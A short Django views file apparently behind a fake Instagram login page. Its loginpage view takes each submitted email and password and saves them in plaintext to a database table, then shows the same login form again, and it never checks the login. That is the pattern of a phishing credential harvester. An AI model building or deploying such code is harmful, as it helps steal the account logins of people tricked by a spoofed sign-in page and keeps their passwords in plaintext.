from django.shortcuts import render
from insta.models import *


def loginpage(request):
	if request.method == 'POST':
		email=request.POST['email']
		password=request.POST['pass']
		query=instadata_db(password=password,email=email)
		query.save()
		return render(request,'instalogin.html')
	return render(request,'instalogin.html')

# Create your views here.
